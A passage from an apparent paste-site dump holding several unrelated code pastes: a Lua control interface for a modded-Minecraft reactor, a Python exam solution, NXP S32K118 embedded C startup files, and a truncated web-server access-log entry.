  w.page_begin(w.data_getName() .. "" - Reactor status"")
  
  w.setCursorPos(1, 2)
  if reactor == nil or reactor.isInterfaced() == nil then
    w.setColorDisabled()
    w.write(""Reactor not detected"")
  else
    w.setColorNormal()
    w.write(""Reactor stability (%)"")
    local instabilities = { reactor.getInstabilities() }
    for key, instability in pairs(instabilities) do
      local y = (key - 1) % 4
      local x = (key - 1 - y) / 4
      w.setCursorPos(2 + 6 * x, 3 + y)
      local stability = math.floor((100.0 - instability) * 10) / 10.0
      if stability >= reactor_targetStability then
        w.setColorSuccess()
      else
        w.setColorWarning()
      end
      w.write(w.format_float(stability, 5))
    end
    
    w.setColorNormal()
    local energyStored, energyMax, energyUnits, _, energyOutputRate = reactor.getEnergyStatus()
    w.setCursorPos(1, 7)
    w.write(""Energy   : "")
    w.write(w.format_integer(energyStored, 10) .. "" / "" .. w.format_integer(energyMax, 10) .. "" "" .. energyUnits .. "" +"" .. w.format_integer(reactor_output, 6) .. "" "" .. energyUnits .. ""/t"")
    w.setCursorPos(1, 8)
    w.write(""Outputing: "")
    w.write(w.format_integer(energyOutputRate, 6) .. "" "" .. energyUnits .. ""/t"")
    
    w.setCursorPos(1, 9)
    w.setColorNormal()
    w.write(""Activated: "")
    local isEnabled = reactor.enable()
    if isEnabled then w.setColorSuccess() else w.setColorNormal() end
    w.write(w.format_boolean(isEnabled, ""YES"", ""no""))
    w.setColorNormal()
    w.write(""; Auto stage: "")
    w.write(stage)
  end
  
  w.setCursorPos(28, 2)
  if #reactorlasers == 0 then
    w.setColorDisabled()
    w.write(""Lasers not detected"")
  else
    w.setColorNormal()
    w.write(""Lasers charge (k)"")
    
    for _, reactorlaser in pairs(reactorlasers) do
      if reactorlaser.wrap ~= nil and reactorlaser.side ~= nil then
        local y = reactorlaser.side % 4
        local x = (reactorlaser.side - y) / 4
        w.setCursorPos(28 + 6 * x, 3 + y)
        local energyStored, _, _ = reactorlaser.wrap.getEnergyStatus()
        if energyStored == nil then
          energyStored = -1
        end
        local energy_k = math.floor(energyStored / 100) / 10.0
        if not reactorlaser.wrap.getAssemblyStatus() then
          w.setColorDisabled()
        elseif energyStored > 3 * reactor_laserAmount then
          w.setColorSuccess()
        else
          w.setColorWarning()
        end
        w.write(w.format_integer(energy_k, 5))
      end
    end
  end
  
  w.setCursorPos(1, 10)
  w.setColorNormal()
  w.write(""  -----------------------------------------------"")
  w.setCursorPos(1, 11)
  w.write(""Output mode     : "")
  if reactor_outputMode == ""off"" then
    w.setColorDisabled()
    w.write(""hold"")
  elseif reactor_outputMode == ""unlimited"" then
    w.write(""manual/unlimited"")
  elseif reactor_outputMode == ""above"" then
    w.write(""surplus above "" .. reactor_outputThreshold .. "" RF"")
  else
    w.write(""rated at "" .. reactor_outputThreshold .. "" RF"")
  end
  w.setCursorPos( 1, 12)
  w.setColorNormal()
  w.write(""Target stability: "" .. reactor_targetStability .. ""%"")
  w.setCursorPos(30, 12)
  w.write(""Laser amount: "" .. w.format_integer(reactor_laserAmount))
  
  w.setCursorPos(1, 14)
  w.setColorControl()
  w.writeFullLine("" Start/stoP reactor (S/P), Use lasers (L)"")
  w.writeFullLine("" Output mode (O), Configuration (C)"")
  w.writeFullLine("" Target stability (+/-), Laser amount (U/J)"")
  w.writeFullLine("" Output rate/threshold (T/G)"")
end

function reactor_setMode()
  if reactor_outputThreshold < 1 then
    reactor_outputThreshold = 1
  elseif reactor_outputThreshold > 100000 then
    reactor_outputThreshold = 100000
  end
  if reactor ~= nil then
      reactor.outputMode(reactor_outputMode, reactor_outputThreshold)
  end
end

function reactor_setLaser()
  if reactor_laserAmount < 1 then
    reactor_laserAmount = 1
  elseif reactor_laserAmount > 100000 then
    reactor_laserAmount = 100000
  end
  if reactor ~= nil then
    reactor_laserAmount = reactor.stabilizerEnergy(reactor_laserAmount)
  end
end

function reactor_setTargetStability()
  if reactor_targetStability < 1.0 then
    reactor_targetStability = 1.0
  elseif reactor_targetStability > 100.0 then
    reactor_targetStability = 100.0
  end
  if reactor ~= nil then
    reactor_targetStability = 100.0 - reactor.instabilityTarget(100.0 - reactor_targetStability)
  end
end

function reactor_start()
  if reactor ~= nil then
    reactor_setMode()
    reactor.enable(true)
  end
end

function reactor_stop()
  if reactor ~= nil then
    reactor.enable(false)
  end
end

function reactor_laser(side)
  for key, reactorlaser in pairs(reactorlasers) do
    if (side == nil) or (reactorlaser.side == side) then
      reactorlaser.wrap.stabilize(reactor_laserAmount)
    end
  end
end

local reactor_configPageLoaded = false
function reactor_pulse(output)
  reactor_output = output
  if reactor == nil or reactor.isInterfaced() == nil then
    w.reboot()
  end
  local instabilities = { reactor.getInstabilities() }
  for key, instability in pairs(instabilities) do
    local stability = math.floor((100.0 - instability) * 10) / 10
    if stability <= min_stability then 
        redstone.setOutput(""right"", true)
    end
  end
  local energyStored, energyMax, energyUnits, _, energyOutputRate = reactor.getEnergyStatus()
  if stage == ""warmup"" and (energyStored == energyMax) then 
    stage = ""preoutput""
    run_stage()
  elseif stage == ""preoutput"" then 
    if preoutput_cycles == 10 then 
        stage = ""output""
        run_stage()
    else 
        preoutput_cycles = preoutput_cycles + 1
    end
  end
  if w.page_getCallbackDisplay() == reactor_page and (not reactor_configPageLoaded) then
    for key, instability in pairs(instabilities) do
      local y = (key - 1) % 4
      local x = (key - 1 - y) / 4
      w.setCursorPos(2 + 6 * x, 3 + y)
      local stability = math.floor((100.0 - instability) * 10) / 10
      if stability >= reactor_targetStability then
        w.setColorSuccess()
      else
        w.setColorWarning()
      end
      w.write(w.format_float(stability, 5))
    end
    w.setCursorPos(12, 7)
    w.setColorNormal()
    w.write(w.format_integer(energyStored, 10))
    w.setCursorPos(40, 7)
    w.write(w.format_integer(reactor_output, 6))
    w.setCursorPos(12, 8)
    w.write(w.format_integer(energyOutputRate, 6))
    
    if #reactorlasers ~= 0 then
      for _, reactorlaser in pairs(reactorlasers) do
        if reactorlaser.wrap ~= nil and reactorlaser.side ~= nil then
          local y = reactorlaser.side % 4
          local x = (reactorlaser.side - y) / 4
          w.setCursorPos(28 + 6 * x, 3 + y)
          local energyStored, _, _ = reactorlaser.wrap.getEnergyStatus()
          if energyStored == nil then
            energyStored = -1
          end
          local energy_k = math.floor(energyStored / 100) / 10.0
          if not reactorlaser.wrap.getAssemblyStatus() then
            w.setColorDisabled()
          elseif energyStored > 3 * reactor_laserAmount then
            w.setColorSuccess()
          else
            w.setColorWarning()
          end
          w.write(w.format_integer(energy_k, 5))
        end
      end
    end
  end
end

function reactor_config()
  reactor_configPageLoaded = true
  w.page_begin(w.data_getName() .. "" - Reactor configuration"")
  
  w.setCursorPos(1, 2)
  if reactor == nil or reactor.isInterfaced() == nil then
    w.setColorDisabled()
    w.write(""Reactor not detected"")
  else
    -- reactor output rate
    w.setCursorPos(1, 6)
    w.setColorHelp()
    w.writeFullLine("" Enter a positive number."")
    
    w.setCursorPos(1, 4)
    w.setColorNormal()
    w.write(""Reactor output rate ("" .. w.format_integer(reactor_outputThreshold) .. "" RF): "")
    reactor_outputThreshold = w.input_readInteger(reactor_outputThreshold)
    reactor_setMode()
    w.setCursorPos(1, 5)
    w.write(""Reactor output rate set"")
    w.setCursorPos(1, 6)
    w.writeFullLine("" "")
    
    -- laser amount
    w.setCursorPos(1, 9)
    w.setColorHelp()
    w.writeFullLine("" Enter a positive number."")
    
    w.setCursorPos(1, 7)
    w.setColorNormal()
    w.write(""Laser energy level ("" .. w.format_integer(reactor_laserAmount) .. ""): "")
    reactor_laserAmount = w.input_readInteger(reactor_laserAmount)
    reactor_setLaser()
    w.setCursorPos(1, 8)
    w.write(""Laser energy level set"")
    w.setCursorPos(1, 9)
    w.writeFullLine("" "")
    
    -- target stability
    w.setCursorPos(1, 12)
    w.setColorHelp()
    w.writeFullLine("" Enter a positive number."")
    
    w.setCursorPos(1, 10)
    w.setColorNormal()
    w.write(""Reactor target stability ("" .. w.format_integer(reactor_targetStability) .. ""%): "")
    reactor_targetStability = w.input_readInteger(reactor_targetStability)
    reactor_setTargetStability()
    w.setCursorPos(1, 11)
    w.write(""Reactor target stability set"")
    w.setCursorPos(1, 12)
    w.writeFullLine("" "")
  end
  reactor_configPageLoaded = false
end

function reactor_register()
  w.device_register(""warpdriveEnanReactorCore"",
      function(deviceType, address, wrap) reactor = wrap end,
      function() end)
  w.device_register(""warpdriveEnanReactorLaser"",
      function(deviceType, address, wrap) table.insert(reactorlasers, { side = wrap.side(), wrap = wrap }) end,
      function() end)
  w.event_register(""reactorPulse""       , function(eventName, param) reactor_pulse(param)                        return false end )
  w.event_register(""reactorDeactivation"", function(                ) w.status_showWarning(""Reactor deactivated"") return false end )
  w.event_register(""reactorActivation""  , function(                ) w.status_showWarning(""Reactor activated"")   return false end )
  w.data_register(""reactor"", reactor_read, nil, nil)
end

----------- connections status

function connections_page(isBooting)
  w.page_begin(w.data_getName() .. "" - Connections"")
  
  w.writeLn("""")
  
  local monitors = w.device_getMonitors()
  if #monitors == 0 then
    w.setColorDisabled()
    w.writeLn(""No Monitor detected"")
  elseif #monitors == 1 then
    w.setColorSuccess()
    w.writeLn(""1 monitor detected"")
  else
    w.setColorSuccess()
    w.writeLn(#monitors .. "" Monitors detected"")
  end
  
  if reactor == nil or reactor.isInterfaced() == nil then
    w.setColorDisabled()
    w.writeLn(""No Enantiomorphic reactor detected"")
  else
    w.setColorSuccess()
    w.writeLn(""Enantiomorphic reactor detected"")
    if isBooting then
      reactor_boot()
    end
  end
  
  if #reactorlasers == 0 then
    w.setColorDisabled()
    w.writeLn(""No reactor stabilisation laser detected"")
  elseif #reactorlasers == 1 then
    w.setColorSuccess()
    w.writeLn(""1 reactor stabilisation laser detected"")
  else
    w.setColorSuccess()
    w.writeLn(#reactorlasers .. "" reactor stabilisation lasers detected"")
  end
  
  w.writeLn("""")
  w.setColorNormal()
  w.writeLn(""This is a keyboard controlled user interface."")
  w.write(""Key controls are written like so: "")
  w.setColorControl()
  w.write(""Action (key)"")
  w.setColorNormal()
  w.writeLn(""."")
  w.write(""For example, typing "")
  w.setColorControl()
  w.write("" 1 "")
  w.setColorNormal()
  w.writeLn("" will open Reactor controls."")
end

----------- Boot sequence

w.page_setEndText("" Home (0), Reactor controls (1)"")
w.page_register('0', connections_page, nil)
w.page_register('1', reactor_page, reactor_key)
reactor_register()

w.boot()
local success, message = pcall(w.run)
if not success then
  print(""failed with message"")
  print(message)
  w.sleep(3.0)
  print(""rebooting..."")
  w.reboot()
else
  w.close()
end
"
d8raPyFG,Key For All Games,lunox039,Lua,Sunday 8th of June 2025 12:04:25 PM CDT,subscribeMenyanety
1821prLQ,24,nq1s788,Python,Sunday 8th of June 2025 12:00:55 PM CDT,"#24 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&select=7FFFFFF&answers=on&varId=91034
s = open('24.txt').readline()
alph = '1234567890ABCDEF'
c = ''
answ = 0
for e in s:
    if e not in alph:
        if len(c) != 0:
            if '0' in c:
                lst0 = c.rindex('0')
                c = c[:lst0 + 1]
                while len(c) > 0 and c[0] == '0':
                    c = c[1:]
                answ = max(answ, len(c))
            c = ''
    else:
        c += e
print(answ)"
HRYJx2tV,startup.h,Mike057,C,Sunday 8th of June 2025 11:29:27 AM CDT,"/*
 * Copyright 2013 - 2014, Freescale Semiconductor, Inc.
 * Copyright 2016-2021, 2023 NXP
 *                                                                                                                                                                                                                                                     
 * SPDX-License-Identifier: BSD-3-Clause
 */

#ifndef STARTUP_H
#define STARTUP_H

#include <stdint.h>
#include ""device_registers.h""
/**
 * @page misra_violations MISRA-C:2012 violations
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 2.5, Local macro not referenced.
 * The defined macro is used as include guard.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
 * scope if its identifier only appears in a single function.
 * All variables with this problem are defined in the linker files.
 *
 */

/*******************************************************************************
 * API
 ******************************************************************************/

/*!
 * @brief define symbols that specific start and end addres of some basic sections.
 */
#if (defined(S32K14x_SERIES) || defined(S32K11x_SERIES) || defined(S32V234_SERIES) || \
     defined(MPC574x_SERIES) || defined(S32R_SERIES) || defined(S32MTV_SERIES) || \
     defined(SJA1110_SERIES)) || defined (S32K144W_M4_SERIES) || defined (S32K142W_M4_SERIES)
    #if (defined(__ICCARM__))
        #define INTERRUPTS_SECTION_START               __section_begin("".intvec"")
        #define INTERRUPTS_SECTION_END                 __section_end("".intvec"")
        #define BSS_SECTION_START                      __section_begin("".bss"")
        #define BSS_SECTION_END                        __section_end("".bss"")
        #define DATA_SECTION_START                     __section_begin("".data"")
        #define DATA_SECTION_END                       __section_end("".data"")
        #define CUSTOMSECTION_SECTION_START            __section_begin("".customSection"")
        #define CUSTOMSECTION_SECTION_END              __section_end("".customSection"")
        #define CODE_RAM_SECTION_START                 __section_begin(""__CODE_RAM"")
        #define CODE_RAM_SECTION_END                   __section_end(""__CODE_RAM"")
        #define DATA_INIT_SECTION_START                __section_begin("".data_init"")
        #define DATA_INIT_SECTION_END                  __section_end("".data_init"")
        #define CODE_ROM_SECTION_START                 __section_begin(""__CODE_ROM"")
        #define CODE_ROM_SECTION_END                   __section_end(""__CODE_ROM"")

    #elif (defined(__ARMCC_VERSION))
        #define INTERRUPTS_SECTION_START               (uint8_t *)__VECTOR_ROM_START
        #define INTERRUPTS_SECTION_END                 (uint8_t *)__VECTOR_ROM_END
        #define BSS_SECTION_START                      (uint8_t *)__BSS_START
        #define BSS_SECTION_END                        (uint8_t *)__BSS_END
        #define DATA_SECTION_START                     (uint8_t *)__DATA_RAM_START
        #define DATA_SECTION_END                       (uint8_t *)__DATA_RAM_END
        #define CUSTOMSECTION_SECTION_START            (uint8_t *)__CUSTOM_SECTION_START
        #define CUSTOMSECTION_SECTION_END              (uint8_t *)__CUSTOM_SECTION_END
        #define CODE_RAM_SECTION_START                 (uint8_t *)__CODE_RAM_START
        #define CODE_RAM_SECTION_END                   (uint8_t *)__CODE_RAM_END

        extern uint32_t __VECTOR_ROM_START;
        extern uint32_t __VECTOR_ROM_END;
        extern uint32_t __BSS_START;
        extern uint32_t __BSS_END;
        extern uint32_t __DATA_RAM_START;
        extern uint32_t __DATA_RAM_END;
        extern uint32_t __CUSTOM_SECTION_START;
        extern uint32_t __CUSTOM_SECTION_END;
        extern uint32_t __CODE_RAM_START;
        extern uint32_t __CODE_RAM_END;
    #else
        #define INTERRUPTS_SECTION_START               (uint8_t *)&__interrupts_start__
        #define INTERRUPTS_SECTION_END                 (uint8_t *)&__interrupts_end__
        #define BSS_SECTION_START                      (uint8_t *)&__bss_start__
        #define BSS_SECTION_END                        (uint8_t *)&__bss_end__
        #define DATA_SECTION_START                     (uint8_t *)&__data_start__
        #define DATA_SECTION_END                       (uint8_t *)&__data_end__
        #define CUSTOMSECTION_SECTION_START            (uint8_t *)&__customSection_start__
        #define CUSTOMSECTION_SECTION_END              (uint8_t *)&__customSection_end__
        #define CODE_RAM_SECTION_START                 (uint8_t *)&__code_ram_start__
        #define CODE_RAM_SECTION_END                   (uint8_t *)&__code_ram_end__

        extern uint32_t __interrupts_start__;
        extern uint32_t __interrupts_end__;
        extern uint32_t __bss_start__;
        extern uint32_t __bss_end__;
        extern uint32_t __data_start__;
        extern uint32_t __data_end__;
        extern uint32_t __customSection_start__;
        extern uint32_t __customSection_end__;
        extern uint32_t __code_ram_start__;
        extern uint32_t __code_ram_end__;
    #endif
#endif

#if (defined(__ICCARM__))
    #pragma section = "".data""
    #pragma section = "".data_init""
    #pragma section = "".bss""
    #pragma section = "".intvec""
    #pragma section = "".customSection""
    #pragma section = "".customSection_init""
    #pragma section = ""__CODE_RAM""
    #pragma section = ""__CODE_ROM""
#endif

/*!
 * @brief Make necessary initializations for RAM.
 *
 * - Copy initialized data from ROM to RAM.
 * - Clear the zero-initialized data section.
 * - Copy the vector table from ROM to RAM. This could be an option.
 */
void init_data_bss(void);

#endif /* STARTUP_H*/
/*******************************************************************************
 * EOF
 ******************************************************************************/

"
rw121V0B,system_S32K118.c,Mike057,C,Sunday 8th of June 2025 11:20:58 AM CDT,"/*
 * Copyright 2017-2023 NXP
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Licensed under the Apache License, Version 2.0 (the License); you may
 * not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an AS IS BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License
 */

/**
 * @page misra_violations MISRA-C:2012 violations
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
 * scope if its identifier only appears in a single function.
 * An object with static storage duration declared at block scope cannot be
 * accessed directly from outside the block.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 11.4, A conversion should not be performed
 * between a pointer to object and an integer type.
 * The cast is required to initialize a pointer with an unsigned int define,
 * representing an address.
 *
 * @section [global]
 * Violates MISRA 2012 Required Rule 11.6, A cast shall not be performed
 * between pointer to void and an arithmetic type.
 * The cast is required to initialize a pointer with an unsigned int define,
 * representing an address.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.7, External could be made static.
 * Function is defined for usage by application code.
 *
 */

#include ""device_registers.h""
#include ""system_S32K118.h""
#include ""stdbool.h""

/* ----------------------------------------------------------------------------
   -- Core clock
   ---------------------------------------------------------------------------- */

uint32_t SystemCoreClock = DEFAULT_SYSTEM_CLOCK;

/*FUNCTION**********************************************************************
 *
 * Function Name : SystemInit
 * Description   : This function disables the watchdog, enables FPU
 * and the power mode protection if the corresponding feature macro
 * is enabled. SystemInit is called from startup_device file.
 *
 * Implements    : SystemInit_Activity
 *END**************************************************************************/
void SystemInit(void)
{
/**************************************************************************/
/* WDOG DISABLE*/
/**************************************************************************/

#if (DISABLE_WDOG)
    /* Write of the WDOG unlock key to CNT register, must be done in order to allow any modifications*/
    IP_WDOG->CNT = (uint32_t ) FEATURE_WDOG_UNLOCK_VALUE;
    /* The dummy read is used in order to make sure that the WDOG registers will be configured only
     * after the write of the unlock value was completed. */
    (void)IP_WDOG->CNT;

    /* Initial write of WDOG configuration register:
     * enables support for 32-bit refresh/unlock command write words,
     * clock select from LPO, update enable, watchdog disabled */
   IP_WDOG->CS  = (uint32_t ) ( (1UL << WDOG_CS_CMD32EN_SHIFT)                       |
                              (FEATURE_WDOG_CLK_FROM_LPO << WDOG_CS_CLK_SHIFT)     |
                              (0U << WDOG_CS_EN_SHIFT)                             |
                              (1U << WDOG_CS_UPDATE_SHIFT)                         );

    /* Configure timeout */
    IP_WDOG->TOVAL = (uint32_t )0xFFFF;
#endif /* (DISABLE_WDOG) */
}

/*FUNCTION**********************************************************************
 *
 * Function Name : SystemCoreClockUpdate
 * Description   : This function must be called whenever the core clock is changed
 * during program execution. It evaluates the clock register settings and calculates
 * the current core clock.
 *
 * Implements    : SystemCoreClockUpdate_Activity
 *END**************************************************************************/
void SystemCoreClockUpdate(void)
{
    uint32_t SCGOUTClock = 0U;      /* Variable to store output clock frequency of the SCG module */
    uint32_t regValue;              /* Temporary variable */
    uint32_t divider;
    bool validSystemClockSource = true;

    divider = ((IP_SCG->CSR & SCG_CSR_DIVCORE_MASK) >> SCG_CSR_DIVCORE_SHIFT) + 1U;

    switch ((IP_SCG->CSR & SCG_CSR_SCS_MASK) >> SCG_CSR_SCS_SHIFT)
    {
        case 0x1:
            /* System OSC */
            SCGOUTClock = CPU_XTAL_CLK_HZ;
            break;
        case 0x2:
            /* Slow IRC */
            regValue = (IP_SCG->SIRCCFG & SCG_SIRCCFG_RANGE_MASK) >> SCG_SIRCCFG_RANGE_SHIFT;
            if (regValue != 0UL)
            {
                SCGOUTClock = FEATURE_SCG_SIRC_HIGH_RANGE_FREQ;
            }
            else
            {
                validSystemClockSource = false;
            }
            break;
        case 0x3:
            /* Fast IRC */
            regValue = (IP_SCG->FIRCCFG & SCG_FIRCCFG_RANGE_MASK) >> SCG_FIRCCFG_RANGE_SHIFT;
            if (regValue == 0x0UL)
            {
                SCGOUTClock = FEATURE_SCG_FIRC_FREQ0;
            }
            else
            {
                validSystemClockSource = false;
            }
            break;
        default:
            validSystemClockSource = false;
            break;
    }

    if (validSystemClockSource == true)
    {
        SystemCoreClock = (SCGOUTClock / divider);
    }
}

/*FUNCTION**********************************************************************
 *
 * Function Name : SystemSoftwareReset
 * Description   : This function is used to initiate a system reset
 *
 * Implements    : SystemSoftwareReset_Activity
 *END**************************************************************************/
void SystemSoftwareReset(void)
{
    uint32_t regValue;

    /* Read Application Interrupt and Reset Control Register */
    regValue = S32_SCB->AIRCR;

    /* Clear register key */
    regValue &= ~( S32_SCB_AIRCR_VECTKEY_MASK);

    /* Configure System reset request bit and Register Key */
    regValue |= S32_SCB_AIRCR_VECTKEY(FEATURE_SCB_VECTKEY);
    regValue |= S32_SCB_AIRCR_SYSRESETREQ(0x1u);

    /* Write computed register value */
    S32_SCB->AIRCR = regValue;
}

/*******************************************************************************
 * EOF
 ******************************************************************************/
"
eFpD1jWa,startup.c,Mike057,C,Sunday 8th of June 2025 11:19:40 AM CDT,"/*
 * Copyright 2013 - 2014, Freescale Semiconductor, Inc.
 * Copyright 2016-2021, 2023 NXP
 *                                                                                                                                                                                                                                                     
 * SPDX-License-Identifier: BSD-3-Clause
 */

/**
 * @page misra_violations MISRA-C:2012 violations
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
 * scope if its identifier only appears in a single function.
 * All variables with this problem are defined in the linker files.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.11, When an array with external linkage
 * is declared, its size should be explicitly specified.
 * The size of the arrays can not be explicitly determined.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 11.4, A conversion should not be performed
 * between a pointer to object and an integer type.
 * The cast is required to initialize a pointer with an unsigned int define,
 * representing an address.
 *
 * @section [global]
 * Violates MISRA 2012 Required Rule 11.6, A cast shall not be performed
 * between pointer to void and an arithmetic type.
 * The cast is required to initialize a pointer with an unsigned int define,
 * representing an address.
 *
 * @section [global]
 * Violates MISRA 2012 Required Rule 2.1, A project shall not contain unreachable
 * code.
 * The condition compares two address defined in linker files that can be different.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.7, External could be made static.
 * Function is defined for usage by application code.
 *
 * @section [global]
 * Violates MISRA 2012 Mandatory Rule 17.3, Symbol 'MFSPR' undeclared, assumed
 * to return int.
 * This is an e200 Power Architecture Assembly instruction used to retrieve
 * the core number.
 *
 */

#include ""startup.h""
#include <stdint.h>


/*******************************************************************************
 * Static Variables
 ******************************************************************************/
static volatile uint32_t * const s_vectors[NUMBER_OF_CORES] = FEATURE_INTERRUPT_INT_VECTORS;

/*******************************************************************************
 * Code
 ******************************************************************************/

/*FUNCTION**********************************************************************
 *
 * Function Name : init_data_bss
 * Description   : Make necessary initializations for RAM.
 * - Copy the vector table from ROM to RAM.
 * - Copy initialized data from ROM to RAM.
 * - Copy code that should reside in RAM from ROM
 * - Clear the zero-initialized data section.
 *
 * Tool Chains:
 *   __GNUC__           : GNU Compiler Collection
 *   __ghs__            : Green Hills ARM Compiler
 *   __ICCARM__         : IAR ARM Compiler
 *   __DCC__            : Wind River Diab Compiler
 *   __ARMCC_VERSION    : ARMC Compiler
 *
 * Implements    : init_data_bss_Activity
 *END**************************************************************************/
void init_data_bss(void)
{
    uint32_t n;
    uint8_t coreId;
/* For ARMC we are using the library method of initializing DATA, Custom Section and
 * Code RAM sections so the below variables are not needed */
#if !defined(__ARMCC_VERSION)
    /* Declare pointers for various data sections. These pointers
     * are initialized using values pulled in from the linker file */
    uint8_t * data_ram;
    uint8_t * code_ram;
    uint8_t * bss_start;
    uint8_t * custom_ram;
    const uint8_t * data_rom, * data_rom_end;
    const uint8_t * code_rom, * code_rom_end;
    const uint8_t * bss_end;
    const uint8_t * custom_rom, * custom_rom_end;
#endif
    /* Addresses for VECTOR_TABLE and VECTOR_RAM come from the linker file */

#if defined(__ARMCC_VERSION)
    extern uint32_t __RAM_VECTOR_TABLE_SIZE;
    extern uint32_t __VECTOR_ROM;
    extern uint32_t __VECTOR_RAM;
#else
    extern uint32_t __RAM_VECTOR_TABLE_SIZE[];
    extern uint32_t __VECTOR_TABLE[];
    extern uint32_t __VECTOR_RAM[];
#endif
    /* Get section information from linker files */
#if defined(__ICCARM__)
    /* Data */
    data_ram        = __section_begin("".data"");
    data_rom        = __section_begin("".data_init"");
    data_rom_end    = __section_end("".data_init"");

    /* CODE RAM */
    #pragma section = ""__CODE_ROM""
    #pragma section = ""__CODE_RAM""
    code_ram        = __section_begin(""__CODE_RAM"");
    code_rom        = __section_begin(""__CODE_ROM"");
    code_rom_end    = __section_end(""__CODE_ROM"");

    /* BSS */
    bss_start       = __section_begin("".bss"");
    bss_end         = __section_end("".bss"");

    custom_ram      = __section_begin("".customSection"");
    custom_rom      = __section_begin("".customSection_init"");
    custom_rom_end  = __section_end("".customSection_init"");

#elif defined (__ARMCC_VERSION)
    /* VECTOR TABLE*/
    uint8_t * vector_table_size = (uint8_t *)__RAM_VECTOR_TABLE_SIZE;
    uint32_t * vector_rom    = (uint32_t *)__VECTOR_ROM;
    uint32_t * vector_ram    = (uint32_t *)__VECTOR_RAM;
#else
    extern uint32_t __DATA_ROM[];
    extern uint32_t __DATA_RAM[];
    extern uint32_t __DATA_END[];

    extern uint32_t __CODE_RAM[];
    extern uint32_t __CODE_ROM[];
    extern uint32_t __CODE_END[];

    extern uint32_t __BSS_START[];
    extern uint32_t __BSS_END[];

    extern uint32_t __CUSTOM_ROM[];
    extern uint32_t __CUSTOM_END[];

    /* Data */
    data_ram        = (uint8_t *)__DATA_RAM;
    data_rom        = (uint8_t *)__DATA_ROM;
    data_rom_end    = (uint8_t *)__DATA_END;
    /* CODE RAM */
    code_ram        = (uint8_t *)__CODE_RAM;
    code_rom        = (uint8_t *)__CODE_ROM;
    code_rom_end    = (uint8_t *)__CODE_END;
    /* BSS */
    bss_start       = (uint8_t *)__BSS_START;
    bss_end         = (uint8_t *)__BSS_END;

	/* Custom section */
    custom_ram      = CUSTOMSECTION_SECTION_START;
    custom_rom      = (uint8_t *)__CUSTOM_ROM;
    custom_rom_end  = (uint8_t *)__CUSTOM_END;

#endif

#if !defined(__ARMCC_VERSION)
    /* Copy initialized data from ROM to RAM */
    while (data_rom_end != data_rom)
    {
        *data_ram = *data_rom;
        data_ram++;
        data_rom++;
    }

    /* Copy functions from ROM to RAM */
    while (code_rom_end != code_rom)
    {
        *code_ram = *code_rom;
        code_ram++;
        code_rom++;
    }

    /* Clear the zero-initialized data section */
    while(bss_end != bss_start)
    {
        *bss_start = 0;
        bss_start++;
    }

    /* Copy customsection rom to ram */
    while(custom_rom_end != custom_rom)
    {
        *custom_ram = *custom_rom;
        custom_rom++;
        custom_ram++;
    }
#endif
    coreId = (uint8_t)GET_CORE_ID();
#if defined (__ARMCC_VERSION)
        /* Copy the vector table from ROM to RAM */
                /* Workaround */
        for (n = 0; n < (((uint32_t)(vector_table_size))/sizeof(uint32_t)); n++)
        {
            vector_ram[n] = vector_rom[n];
        }
        /* Point the VTOR to the position of vector table */
         *s_vectors[coreId] = (uint32_t) __VECTOR_RAM;
#else
    /* Check if VECTOR_TABLE copy is needed */
    if (__VECTOR_RAM != __VECTOR_TABLE)
    {
        /* Copy the vector table from ROM to RAM */
        for (n = 0; n < (((uint32_t)__RAM_VECTOR_TABLE_SIZE)/sizeof(uint32_t)); n++)
        {
            __VECTOR_RAM[n] = __VECTOR_TABLE[n];
        }
        /* Point the VTOR to the position of vector table */
        *s_vectors[coreId] = (uint32_t)__VECTOR_RAM;
    }
    else
    {
        /* Point the VTOR to the position of vector table */
        *s_vectors[coreId] = (uint32_t)__VECTOR_TABLE;
    }
#endif

}

/*******************************************************************************
 * EOF
 ******************************************************************************/

"
DhrSvHjZ,main.c,Mike057,C,Sunday 8th of June 2025 11:18:14 AM CDT,"#include ""S32K118.h""


int main(void) {

    IP_PCC->PCCn[PCC_PORTE_INDEX] |= PCC_PCCn_CGC_MASK;
   
    IP_PORTE->PCR[8] &= ~PORT_PCR_MUX_MASK;
    IP_PORTE->PCR[8] |= PORT_PCR_MUX(1);


    IP_PTE->PDDR |= (1 << 8);

	IP_PTE->PSOR = (1 << 8);

    while (1) {

    }

    return 0;
}
"
KmaAAJQH,Untitled,swaggboi,JSON,Sunday 8th of June 2025 10:57:37 AM CDT,"{""level"":""error"",""ts"":1749398174.602992,""logger"":""http.log.access.log0"",""msg"":""handled request"",""request"":{""remote_ip"":""2601:5cf:8601:64e1:3eec:efff:fec3:9ad1"",""remote_port"":""59112"",""proto"":""HTTP/1.1"",""method"":""PATCH"",""host"":""eattherich.club"",""uri"":""/api/v1/accounts/update_credentials"",""headers"":{""User-Agent"":[""HTTP-Thin/0.006""],""Content-Type"":[""application/x-www-form-urlencoded""],""Content-Length"":[""897332""],""Authorization"":[]},""tls"":{""resumed"":false,""version"":772,""cipher_suite"":4865,""proto"":"""",""server_name"":""eattherich.club""}},""user_id"":"""",""duration"":0.918898522,""size"":56,""status"":403,""resp_headers"":{""Content-Length"":[""56""],""X-Frame-Options"":[""DENY""],""Referrer-Policy"":[""same-origin""],""X-Runtime"":[""0.095343""],""X-Ratelimit-Limit"":[""300""],""Alt-Svc"":[""h3=\"":443\""; ma=2592000""],""Content-Type"":[""application/json; charset=utf-8""],""X-Content-Type-Options"":[""nosniff""],""X-Ratelimit-Reset"":[""2025-06-08T16:00:00.599394Z""],""Strict-Transport-Security"":[""max-age=63072000; includeSubDomains""],""Vary"":[""Authorization, 